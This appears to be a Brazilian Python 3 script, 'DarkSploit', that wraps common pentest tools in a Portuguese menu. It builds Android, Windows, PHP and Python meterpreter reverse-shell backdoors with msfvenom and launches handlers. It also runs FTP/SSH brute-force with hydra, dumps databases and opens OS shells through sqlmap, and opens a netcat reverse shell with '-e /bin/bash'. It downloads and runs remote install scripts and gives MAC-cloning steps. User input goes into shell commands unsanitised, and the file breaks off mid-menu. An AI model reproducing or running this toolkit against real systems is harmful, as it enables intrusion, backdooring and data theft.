#!/usr/bin/python3

# coded by: tio dark
# telegram user: @SrRooting
# team: Dark Security
# site: https://darksecuritybrazil.blogspot.com.br/
# developed day: 02/03/2018
# script 95% baseado no nmap, ter ele será essencial!

import sys
import os
import time
import requests
import re

# limpar tela
os.system("clear")

# menu
banner1 = os.system('figlet -f standard "Dark Sploit"')
print("")
print("[01] Coleta de Informações    [06] Setup   ")
print("[02] Procurar Falhas          [07] Créditos")
print("[03] Scanner Web              [08] Ajuda   ")
print("[04] Exploração               [09] Sair    ")
print("[05] Extras                              \n")

# escolha
op = input("DarkSploit >> ")

# sub-menu
if op == '01':
	os.system('clear')
	os.system('figlet -f standard "Dark Analise"')
	print("")
	print("[01] Scanner de Portas     [06] Detectar Firewall")
	print("[02] Whois                 [07] Pegar Info de IRC")
	print("[03] Detectar Sistema      [08] Voltar ao Menu")
	print("[04] WhatWeb               ")
	print("[05] Capturar Banner\n     ")

	op1 = input("DarkSploit >> ")

	if op1 == '01':
		os.system('clear')
		os.system('figlet -f standard "Port Scanner"')
		ip = input("Digite o Dominio ou IP: ")
		os.system('nmap -Pn -sV {}'.format(ip))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '02':
		os.system('clear')
		os.system('figlet -f standard "Dark Whois"')
		sitew = input("Digite o Dominio do Site: ")
		os.system('nmap --script=whois-domain.nse {}'.format(sitew))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 =='03':
		os.system('clear')
		os.system('figlet -f standard "Sistema"')
		asys = input("Digite o IP da Máquina: ")
		time.sleep(1)
		print("")
		print("Scanning {}".format(asys))
		print("")
		time.sleep(2)
		print("Se não apareceu nada é pq falhou...\n")
		print("Scanning...\n")
		os.system("nmap -O -f {} | grep OS".format(asys))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '04':
		os.system('clear')
		os.system('figlet -f standard "WhatWeb"')
		site4 = input("Digite o Dominio do Site: ")
		os.system("whatweb {}".format(site4))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '05':
		os.system('clear')
		os.system('figlet -f standard "Banner Cap"')
		print("Principais Portas:\n 21 FTP | 22 SSH | 23 TELNET | 25 SMTP | 194 IRC |...|")
		print("")
		siteb = input("Digite o IP do Servidor: ")
		portab = input("Digite a Porta: ")
		os.system('nmap --script=banner.nse {} {}'.format(siteb, portab))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '06':
		os.system('clear')
		os.system('figlet -f standard "Detect Dark"')
		sited = input("Digite o Dominio ou IP: ")
		os.system("nmap -Pn -f --script=http-waf-detect.nse {}".format(sited))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '07':
		os.system('clear')
		os.system('figlet -f standard "Dark IRC Havester"')
		srvh = input("Digite o IP do Servidor IRC: ")
		os.system("nmap -Pn --script=irc-info.nse {}".format(srvh))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op1 == '08':
		print("Voltando...")
		time.sleep(3)
		os.system("python3 darksploit.py")
	elif op1 == 'voltar':
		os.system("python3 darksploit.py")
	else:
		print("Opção {} invalida.".format(op1))
		time.sleep(3)
		print("Voltando...")
		time.sleep(1)
		os.system("python3 darksploit.py")
elif op == '02':
	os.system('clear')
	os.system('figlet -f standard "Dark Scanner"')
	print("[01] Aplicação Scanner via Dork     [06] Procurar SQL Injetion")
	print("[02] Procurar http errors           [07] FTP ProFtpd Backdoor Check")
	print("[03] Procurar falhas de csrf        [08] FTP VsFtpd Backdoor")
	print("[04] Enumerar Users do Wordpress    [09] FTP Anon Login Check")
	print("[05] Procurar XSS Stored            [10] Voltar para o Menu\n")
	
	# escolha do submenu 2
	opi = input("DarkSploit >> ")

	if opi == '01':
		os.system('clear')
		os.system('figlet -f standard "SQL Scanner"')
		print("Esse Metodo é baseado na Dork ")
		sitea = input("Digite o Dominio do Site: ")
		os.system('"sqlmap -g site:{} inurl:.php?id="'.format(sitea))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '02':
		os.system('clear')
		os.system('figlet -f standard "Errros Scanner"')
		print("Em busca da Página de Erro :D ")
		sitee = input("Digite o Dominio do Site: ")
		os.system('nmap --script=http-errors.nse {} | grep {}'.format(sitee, sitee))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '03':
		os.system('clear')
		os.system('figlet -f standard "CSRF Scanner"')
		sitec = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=http-csrf.nse {} | grep {}'.format(sitec, sitec))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '04':
		os.system('clear')
		os.system('figlet -f standard "Wordpress Enum"')
		siteww = input("Digite o Dominio do Site: ")
		print("")
		os.system('nmap -Pn --script=http-wordpress-users.nse {}'.format(siteww))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '05':
		os.system('clear')
		os.system('figlet -f standard "XSS Stored"')
		sitexx = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=http-stored-xss.nse {} | grep http'.format(sitexx))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '06':
		os.system('clear')
		os.system('figlet -f standard "SQL Injetion"')
		print("")
		sitesq = input("Digite o Dominio do Site: ")
		print("")
		# print("Scanning {} ...".format(sitesq))
		os.system('nmap -Pn --script=http-sql-injection.nse {} -v | grep {}'.format(sitesq, sitesq))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '07':
		os.system('clear')
		os.system('figlet -f standard "ProFtpd Backdoor"')
		print("+---------------------------------------------------+")
		print("|Esse Script vai tentar rodar o comando <ls> no ftp.|")
		print("|Se deu certo vai aparecer os arquivos. Se não, vai |")
		print("|aparecer só as portas...         -[ProFtpd]        |")
		print("+---------------------------------------------------+")
		proftpd = input("Digite o IP do FTP: ")
		print("")
		print("Checking Backdoor in {} ...".format(proftpd))
		os.system('nmap -Pn --script=ftp-proftpd-backdoor.nse {}'.format(proftpd))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '08':
		os.system('clear')
		os.system('figlet -f standard "VsFtpd Backdoor"')
		print("+---------------------------------------------------+")
		print("|Esse Script vai tentar rodar o comando <ls> no ftp.|")
		print("|Se deu certo vai aparecer os arquivos. Se não, vai |")
		print("|aparecer só as portas...        -[VsFtpd]          |")
		print("+---------------------------------------------------+")
		vsftpd = input("Digite o IP do FTP: ")
		print("")
		print("Checking Backdoor in {} ...".format(vsftpd))
		os.system('nmap -Pn --script=ftp-vsftpd-backdoor.nse {}'.format(vsftpd))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '09':
		os.system('clear')
		os.system('figlet -f standard "Check AnonFTP"')
		print("+---------------------------------------------------+")
		print("|Esse Script vai Checkar se Existe o Login Anonimo  |")
		print("|no Servidor FTP...                                 |")
		print("+---------------------------------------------------+")
		anftp = input("Digite o IP do FTP: ")
		print("")
		time.sleep(2)
		print("Checking {}  ...".format(anftp))
		os.system('nmap -Pn --script=ftp-anon.nse {}'.format(anftp))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif opi == '10':
		print("Voltando...")
		time.sleep(3)
		os.system("python3 darksploit.py")
	else:
		print("Opção {} invalida.".format(opi))
		time.sleep(3)
		print("Voltando...")
		time.sleep(1)
		os.system("python3 darksploit.py")
elif op == '03':
	os.system("clear")
	os.system('figlet -f standard "Scanner Web"')
	print("[01] Scanner Completo (demora)     [06] Check Webdav Vuln ")
	print("[02] Nikto                         [07] Check robots.txt")
	print("[03] Gerar Lista de Dorks          [08] Enumerar dir Importantes")
	print("[04] CSS Injection                 [09] FileUpload Exploiter")
	print("[05] Check Slowloris D.O.S         [10] Voltar\n")

	# escolha 3
	op3 = input("DarkSploit >> ")

	if op3 == '01':
		os.system('clear')
		os.system('figlet -f standard "Scanner Full"')
		print("+-------------------------------------+")
		print("|Esse tipo de Scanner demora um pouco.|")
		print("+-------------------------------------+")
		print("")
		siteff = input("Digite o Dominio do Site: ")
		save = input("Deseja salvar o resultado em um .TXT [s/n]? ")
		if save == 's':	
			print("")
			print("Scanning {} ...".format(siteff))
			os.system('nmap -Pn -A --script=vuln {} > dark_results.txt'.format(siteff))
			print("")
			print("Os resultados foram salvo no arquivo: dark_results.txt")
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif save =='n':
			print("")
			os.system('nmap -Pn -A --script=vuln {}'.format(siteff))
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		else:
			print("Opção {} invalida.".format(save))
			time.sleep(3)
			print("Voltando...")
			time.sleep(1)
			os.system("python3 darksploit.py")
	elif op3 == '02':
		os.system('clear')
		os.system('figlet -f standard "Nikto Scanner"')
		print("+----------------------------+")
		print("| Simples scan web com Nikto |")
		print("+----------------------------+")
		print("")
		sitenn = input("Digite o Dominio do Site: ")
		print("Exemplo: 80,88,443,8080 etc...")
		portann = input("Digite a Porta: ")
		print("")
		os.system('nikto -h {} -p {}'.format(sitenn, portann))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '03':
		os.system('clear')
		os.system('figlet -f standard "DorkGen"')
		dorkkk = input("Deseja Baixar: [s/n]? ")
		if dorkkk == 's':
			os.system('wget http://hotgram4.filmiro.com/2017/05/30/128/4999321428370128909.txt')
			print("")
			os.system("mv 4999321428370128909.txt dorks_dark.txt")
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif dorkkk =='n':
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		else:
			print("Opção {} invalida.".format(dorkkk))
			time.sleep(3)
			print("Voltando...")
			time.sleep(1)
			os.system("python3 darksploit.py")
	elif op3 == '04':
		os.system('clear')
		os.system('figlet -f standard "CSS Injection"')
		sitecss = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=ssl-ccs-injection.nse {}'.format(sitecss))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '05':
		os.system('clear')
		os.system('figlet -f standard "Check D.O.S"')
		sitedos = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=http-slowloris-check.nse {}'.format(sitedos))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '06':
		os.system('clear')
		os.system('figlet -f standard "Check Webdav"')
		sitewd = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=http-iis-webdav-vuln.nse {}'.format(sitewd))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '07':
		os.system('clear')
		os.system('figlet -f standard "Check Robots"')
		siterb = input("Digite o Dominio do Site: ")
		os.system('nmap -Pn --script=http-robots.txt.nse {} | grep -i robots'.format(siterb))
		print("")
		print("Se não aparecer nada é pq não tem.")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '08':
		os.system('clear')
		os.system('figlet -f standard "Enumerar Dir"')
		sitedir = input("Digite o Dominio do Site: ")
		time.sleep(1.5)
		print("\nScanning {} ...".format(sitedir))
		os.system('nmap -Pn --script=http-enum.nse {} | grep "|"'.format(sitedir))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '09':
		os.system('clear')
		os.system('figlet -f standard "FileUpload Exploiter"')
		siteup = input("\nDigite o Dominio do Site: ")
		print("")
		os.system('nmap -Pn --script=http-fileupload-exploiter.nse {} | grep -i http'.format(siteup))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op3 == '10':
		time.sleep(1)
		print("Opção {}, Ok Estou voltando...".format(op3))
		time.sleep(3)
		os.system("python3 darksploit.py")
	else:
		print("Opção {} invalida.".format(op3))
		time.sleep(3)
		print("Voltando...")
		time.sleep(1)
		os.system("python3 darksploit.py")

elif op == '04':
	os.system("clear")
	os.system('figlet -f standard "Exploitation"')
	print("")
	print("[01] Criar Backdoors        [06] Brute-force em Dir")
	print("[02] Brute-force FTP        [07] Procurar Exploit do Serviço")
	print("[03] Brute-force SSH        [08] Commix Shell")
	print("[04] Sqlmap Automatico      [09] Sqlmap Shell")
	print("[05] Netcat Automatico      [10] Voltar\n")

	# escolha 4
	op4 = input("DarkSploit >> ")
	if op4 == '01':
		os.system('clear')
		os.system('figlet -f standard "Backdoor"')
		print("")
		print("[01] Android")
		print("[02] Windows")
		print("[03] Backdoor em PHP (Linux)")
		print("[04] Backdoor em Python (Linux)")
		print("[05] Voltar ao Menu\n")
		bk = input("DarkSploit >> ")
		if bk == '01':
			os.system("clear")
			os.system('figlet -f standard "Android Backdoor"')
			lh = input("Digite seu IP: ")
			print("\nA Porta tem que estar Aberta.")
			lp = input("Digite sua Porta: ")
			print("\nSem o <.apk>")
			nm = input("Digite o Nome do Backdoor: ")
			time.sleep(2)
			print("\nNome: {}.apk\nIP: {}\nPorta: {}\nCriando Backdoor...\n".format(nm, lh, lp))
			time.sleep(4)
			os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}.apk | grep size".format(lh, lp, nm))
			print("O seu Backdoor Será Listado Abaixo.")
			time.sleep(1)
			os.system("ls | grep {}.apk".format(nm))
			stt = input("\nQuer Iniciar o Metasploit para Escutar o Backdoor? [s/n] ")
			if stt == 's':
				os.system("clear")
				os.system('msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost {} ; set lport {} ; exploit"'.format(lh, lp))
			elif stt == 'n':
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
			else:
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
		elif bk == '02':
			os.system("clear")
			os.system('figlet -f standard "Windows Backdoor"')
			lh = input("Digite seu IP: ")
			print("\nA Porta tem que estar Aberta.")
			lp = input("Digite sua Porta: ")
			print("\nSem o <.exe>")
			nm = input("Digite o Nome do Backdoor: ")
			time.sleep(2)
			print("\nNome: {}.exe\nIP: {}\nPorta: {}\nCriando Backdoor...\n".format(nm, lh, lp))
			time.sleep(4)
			os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} R > {}.exe | grep size".format(lh, lp, nm))
			print("O seu Backdoor Será Listado Abaixo.")
			time.sleep(1)
			os.system("ls | grep {}.exe".format(nm))
			stt = input("\nQuer Iniciar o Metasploit para Escutar o Backdoor? [s/n] ")
			if stt == 's':
				os.system("clear")
				os.system('msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {} ; set lport {} ; exploit"'.format(lh, lp))
			elif stt == 'n':
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
			else:
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
		elif bk == '03':
			os.system("clear")
			os.system('figlet -f standard "Linux Backdoor"')
			lh = input("Digite seu IP: ")
			print("\nA Porta tem que estar Aberta.")
			lp = input("Digite sua Porta: ")
			print("\nSem o <.php>")
			nm = input("Digite o Nome do Backdoor: ")
			time.sleep(2)
			print("\nNome: {}.php\nIP: {}\nPorta: {}\nCriando Backdoor...\n".format(nm, lh, lp))
			time.sleep(4)
			os.system("msfvenom -p php/meterpreter/reverse_tcp LHOST={} LPORT={} -e php/base64 R > {}.php | grep size".format(lh, lp, nm))
			print("O seu Backdoor Será Listado Abaixo.")
			time.sleep(1)
			os.system("ls | grep {}.php".format(nm))
			stt = input("\nQuer Iniciar o Metasploit para Escutar o Backdoor? [s/n] ")
			if stt == 's':
				os.system("clear")
				os.system('msfconsole -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost {} ; set lport {} ; exploit"'.format(lh, lp))
			elif stt == 'n':
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
			else:
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
		elif bk == '04':
			os.system("clear")
			os.system('figlet -f standard "Linux Backdoor"')
			lh = input("Digite seu IP: ")
			print("\nA Porta tem que estar Aberta.")
			lp = input("Digite sua Porta: ")
			print("\nSem o <.py>")
			nm = input("Digite o Nome do Backdoor: ")
			time.sleep(2)
			print("\nNome: {}.py\nIP: {}\nPorta: {}\nCriando Backdoor...\n".format(nm, lh, lp))
			time.sleep(4)
			os.system("msfvenom -p python/meterpreter/reverse_tcp LHOST={} LPORT={} -e python/base64 R > {}.py | grep size".format(lh, lp, nm))
			print("O seu Backdoor Será Listado Abaixo.")
			time.sleep(1)
			os.system("ls | grep {}.py".format(nm))
			stt = input("\nQuer Iniciar o Metasploit para Escutar o Backdoor? [s/n] ")
			if stt == 's':
				os.system("clear")
				os.system('msfconsole -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set lhost {} ; set lport {} ; exploit"'.format(lh, lp))
			elif stt == 'n':
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
			else:
				os.system("clear")
				time.sleep(1)
				print("Voltando ao Menu...")
				time.sleep(2)
				os.system("python3 darksploit.py")
		elif bk == '05':
			os.system("clear")
			time.sleep(1)
			print("Voltando...")
			time.sleep(3)
			os.system("python3 darksploit.py")	
		else:
			print("Opção {} invalida.".format(bk))
			time.sleep(3)
			print("Voltando...")
			time.sleep(1)
			os.system("python3 darksploit.py")
	elif op4 == '02':
		os.system('clear')
		os.system('figlet -f standard "FTP Brute"')
		ftpsite = input("\nDigite o IP do FTP: ")
		userf = input("\nDigite o User: ")
		passf = input("\nDigite o nome da Wordlist: ")
		print("")
		os.system('hydra -l {} -P {} {} ftp'.format(userf, passf, ftpsite))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op4 == '03':
		os.system('clear')
		os.system('figlet -f standard "SSH Brute"')
		sshsite = input("\nDigite o Dominio do Site: ")
		userss = input("\nDigite o User: ")
		passss = input("\nDigite o nome da Wordlist: ")
		print("")
		os.system('hydra -l {} -P {} {} ssh -t 3'.format(userss, passss, sshsite))
		print("")
		input("Aperte Enter para Voltar ao Menu...")
		os.system('python3 darksploit.py')
	elif op4 == '04':
		os.system('clear')
		os.system('figlet -f standard "Auto Sqlmap"')

		# alvo
		site = input('\nDigite a URL com a falha: ')
		os.system('sqlmap -u {} --dbs --random-agent'.format(site))

		# databse
		database = input('\nSe não aparecer nada, apenas saia.\nDigite a Database: ')
		os.system('sqlmap -u {} -D {} --tables --random-agent'.format(site, database))

		# tablea
		tabela = input('\nDigite a Tabela: ')
		os.system('sqlmap -u {} -D {} -T {} --columns --random-agent'.format(site, database, tabela))

		# coluna
		coluna = input('\nDigite a Coluna: ')
		os.system('sqlmap -u {} -D {} -T {} -C {} --dump --random-agent'.format(site, database, tabela, coluna))

		# final
		ops = input("\nDeseja Voltar ao Menu? [s/n] ")
		if ops == 's':
			os.system("clear")
			time.sleep(1)
			print("Voltando...")
			time.sleep(2)
			os.system("python3 darksploit.py")
		elif ops == 'n':
			input("Aperte CTRL+C e sair quando quiser. :D")
		else:
			os.system("clear")
			print("Comando {} Invalido!".format(ops))
			time.sleep(2)
			os.system("python3 darksploit.py")
	elif op4 == '05':
		os.system("clear")
		os.system('figlet -f standard "Netcat Auto"')
		print("")
		print("[01] Conectar em Algo ")
		print("[02] Escutar Porta  ")
		print("[03] Shell Reverese   ")
		
		# netcat escolha
		opnet = input("\nDarkSploit >> ")

		if opnet == '01':
			os.system("clear")
			os.system('figlet -f standard "Connect"')
			sitei = input("Digite o Dominio ou IP: ")
			portan = input("Digite a Porta: ")
			os.system("netcat {} {}".format(sitei, portan))
			print("\nConexão Fechada! <dark-security>")
		elif opnet == '02':
			os.system("clear")
			os.system('figlet -f standard "Listing Port"')
			portaa = input("Digite a Porta: ")
			os.system("netcat -nvlp {}".format(portaa))
			print("\nConexão Fechada! <dark-security>")
		elif opnet == '03':
			os.system("clear")
			os.system('figlet -f standard "Reverese Shell"')
			alvo = input("Alvo: ")
			portaa = input("Digite a Porta: ")
			os.system("netcat {} {} -e /bin/bash".format(alvo, portaa))
			print("\nConexão Fechada! <dark-security>")
	elif op4 == '06':
		os.system("clear")
		os.system('figlet -f standard "Dir-Brute"')
		sitebb = input("\nExemplo: http://darksec.com/dados/\nDigite a URL: ")
		wdl = input("Deseja usar Wordlist Padrão ou Personalizada? [padr/pers] ")
		if wdl == 'padr':
			os.system("clear")
			os.system("dirb {}".format(sitebb))
			input("\nAperte Enter para sair.")
		elif wdl == 'pers':
			os.system("clear")
			wordl = input("Digite o Caminho da sua Wordlist: ")
			os.system("dirb {} {}".format(sitebb, wordl))
			input("Aperte Enter para Sair.")
		else:
			os.system("clear")
			time.sleep(1)
			print("Comando {} Invalido!".format(wdl))
			time.sleep(1)
			print("Voltando ao Menu...")
			time.sleep(3)
			os.system("python3 darksploit.py")
	elif op4 == '07':
		os.system("clear")
		os.system('figlet -f standard "Exploiter"')
		print("+---------------------------------------------------+")
		print("|  Esse Script vai Automatizar a Busca de Exploits  |")
		print("|      Ele usa a base de dados do Metasploit.       |")
		print("|                                                   |")
		print("|                    <tio-dark>                     |")
		print("+---------------------------------------------------+")
		print("\nEpenas coloque o Nome da Versão do Serviço Abaixo")
		print("Farei a Busca na base de dados do Metasploit.\n")
		serv = input("Digite a Versão do Serviço: ")
		time.sleep(1)
		print("Iniciando o Metasploit...")
		time.sleep(3)
		os.system('msfconsole -x "search {}"'.format(serv))
	elif op4 == '08':
		os.system("clear")
		os.system('figlet -f standard "Commix Shell"')
		urlf = input("\nDigite a URL com a falha: ")
		time.sleep(2)
		print("Exemplo: http://192.168.1.12/cmd/teste.php?addr=127.0.0.1")
		os.system('commix --url="{}"'.format(urlf))
		print("")
		input("Aperte Enter para Voltar.")
		os.system("python3 darksploit.py")
	elif op4 == '09':
		os.system("clear")
		os.system('figlet -f standard "Sqlmap Shell"')
		urlsq = input("\nDigite a URL com a falha: ")
		print("")
		print("                      Tipos de Shells                         ")
		print("##############################################################")
		print("# [1] --sql-shell    | Prompt interativa a SQL               #")
		print("# [2] --os-shell     | Prompt interativa com o Sistema       #")
		print("# [3] --os-pwn       | Prompt OOB Shell, Meterpreter ou VNC  #")
		print("# [4] --sqlmap-shell | Shell interativa do Sqlmap            #")
		print("##############################################################\n")
		sqlss = input("Escolha a shell: ")
		if sqlss == '1':
			os.system("sqlmap -u {} --sql-shell".format(urlsq))
		elif sqlss == '2':
			os.system("sqlmap -u {} --os-shell".format(urlsq))
		elif sqlss == '3':
			os.system("sqlmap -u {} --os-pwn".format(urlsq))
		elif sqlss == '4':
			os.system("sqlmap -u {} --sqlmap-shell".format(urlsq))
		else:
			print("Opção {} invalida.".format(sqlss))
			time.sleep(3)
			print("Voltando...")
			time.sleep(1)
			os.system("python3 darksploit.py")
	elif op4 == '10':
		time.sleep(1)
		print("Opção {}, Ok Estou voltando...".format(op4))
		time.sleep(3)
		os.system("python3 darksploit.py")
	else:
		print("Opção {} invalida.".format(op4))
		time.sleep(3)
		print("Voltando...")
		time.sleep(1)
		os.system("python3 darksploit.py")
elif op == '05':
		os.system("clear")
		os.system('figlet -f standard "Extras"')
		print("")
		print("[01] URL Crawler                 [05] Voltar ao Menu")
		print("[02] Email Finder                                   ")
		print("[03] Ver Quem Está na sua rede                      ")
		print("[04] Como Clonar o Mac                            \n")

		# sub escolha 5
		ex = input("DarkSploit >> ")

		if ex == '01':
			os.system("clear")
			os.system("figlet Crowler")
			print("\nExemplo: http://testphp.vulnweb.com/")
			to_crawl = input("Digite a URL: ")
			print("")
			crowled = set()

			req = requests.get(to_crawl)
			html = req.text

			padrao = re.findall(r'<a href="?\'?(http?:\/\/[^"\'>]*)', html)

			for link in padrao:
				print("Achou: {}".format(link))
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif ex == '02':
			os.system("clear")
			os.system("figlet Email Finder")
			to_crawl = input("Digite a URL: ")
			print("")
			crowled = set()
			req = requests.get(to_crawl)
			html = req.text
			padrao = re.findall(r'\w+@\w+\.\w+', html)
			for link in padrao:
				print("Achou: {}".format(link))
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif ex == '03':
			os.system('clear')
			os.system('figlet -f standard "Local OS Finder"')
			os.system("ifconfig | grep 192.168....")
			print("")
			gtw = input("Exemplo: 192.168.1.3\nDigite o seu IP Local: ")
			time.sleep(1.5)
			print("\nScanning...\n")
			os.system('nmap -sn {}/24 | grep -i MAC'.format(gtw))
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif ex == '04':
			os.system('clear')
			os.system('figlet -f standard "Mac Changer"')
			print("")
			print('''
1- Abra o terminal digite  (ifconfig) pra saber qual o nome da interface wireles de seu sistema!!

2- Observe a o nome da interface que sempre começa com wlan.

3- Digite no terminal o comando (airmon-ng check kill).

4- Após o comando acima digite esse (airmon-ng start wlan0)

5- Por ultimo esse (airodump-ng wlan0mon)

observe que sua placa de rede vai estar em modo de captura

anote os macs correspondentes que voce quer clonar!!

6-Apos ter anotado os macs abra outro terminal e digite os seguintes codigos:

7-ifconfig wlan0 down

8-coloque o endereço mac desejado entre os parenteses:

macchanger -m (MAC) wlan0

9-Agora digite o seguinte codigo

ifconfig wlan0 up

10-Agora de um ifconfig pra ter certeza de que funcionou.

skype para duvidas : riv3iroc''')
			#maac = input("Digite o Mac de Deseja Clonar: ")
			#itf = input("Exemplo: wlan0, wlan2\nDigite o Nome da sua Interface: ")
			#time.sleep(1.5)
		    #print("\nCloning...\n")
			# os.system('macchanger -m ({}) {}'.format(maac, itf))
			print("")
			input("Aperte Enter para Voltar ao Menu...")
			os.system('python3 darksploit.py')
		elif ex == '05':
			os.system("clear")
			time.sleep(1)
			print("Voltando ao Menu...")
			time.sleep(3)
			os.system("python3 darksploit.py")
		else:
			os.system("clear")
			time.sleep(1)
			print("Comando {} Invalido!".format(ex))
			time.sleep(1)
			print("Voltando ao Menu...")
			time.sleep(3)
			os.system("python3 darksploit.py")
elif op == '06':
			os.system('clear')
			os.system('figlet -f standard "Install"')
			print("\n[!] Para Termux e GNUroot, Algumas não vão funcionar corretamente.\n[!] Agora em Distros de Pentest Já Vem quase tudo.\n")
			print("[01] Distros de Pentest (ParrotSec, Kali, Backbox, Etc...)")
			print("[02] Termux e GNUroot (Android)")
			print("[03] Instalar o Metasploit (Android)")
			print("[04] Instalar o Metasploit (Caso a Opção <03> tenha problemas)")
			print("[05] Voltar ao Menu")
			print("")

			# Escolha do Install
			bx = input("DarkSploit >> ")
			if bx == '01':
				os.system('clear')
				os.system('figlet -f standard "Install"')
				print("Agora é só ir confirmando com <y>")
				input("Aperte Enter para Continuar... ")
				os.system("apt-get install figlet")
				# os.system("apt-get install nmap")
				# os.system("apt-get install sqlmap")
				# os.system("apt-get install netcat")
				os.system("apt-get install nikto")
				os.system("apt-get install wget")
				os.system("apt-get install whatweb")
				# os.system("apt-get install curl")
				input("\nAperte Enter para Voltar ao Menu...")
				os.system('python3 darksploit.py')
			elif bx == '02':
				os.system('clear')
				os.system('figlet -f standard "Install Android"')
				print("Agora é só ir confirmando com <y>")
				input("Aperte Enter para Continuar... ")
				os.system("apt-get install figlet")
				os.system("apt-get install nmap")
				os.system("apt-get install sqlmap")
				os.system("apt-get install netcat")
				os.system("apt-get install nikto")
				os.system("apt-get install wget")
				os.system("apt-get install whatweb")
				os.system("apt-get install curl")
				input("\nAperte Enter para Voltar ao Menu...")
				os.system('python3 darksploit.py')
			elif bx == '03':
				os.system('clear')
				os.system('figlet -f standard "Install Metasploit"')
				print("Agora é só ir confirmando com <y>")
				input("Aperte Enter para Continuar... ")
				os.system("apt update")
				os.system("apt install wget")
				os.system("termux-setup-storage")
				os.system("wget https://raw.githubusercontent.com/DisorderSec/repo/master/metasploit.sh")
				os.system("chmod +x metasploit.sh")
				os.system("sh metasploit.sh -y")
				os.system("clear")
				print("Iniciando Metasploit Framework...")
				time.sleep(3)
				os.system("clear")
				os.system("msfconsole")
			elif bx == '04':
				os.system('clear')
				os.system('figlet -f standard "Install Metasploit 2"')
				print("Agora é só ir confirmando com <y>")
				input("Aperte Enter para Continuar... ")
				os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall')
				input("\nAperte Enter para Voltar ao Menu...")
				os.system('python3 darksploit.py')
			elif bx == '05':
				os.system("clear")
				print("Voltando ao Menu...")
				time.sleep(3)
				os.system("python3 darksploit.py")
			else:
				print("Opção {} invalida.".format(bx)) 
				time.sleep(2)
				print("Voltando...")
				time.sleep(1)
				os.system("python3 darksploit.py")
elif op == '07':
	os.system('clear')
	os.system('figlet -f standard "Creditos"')
	print("##########################################")
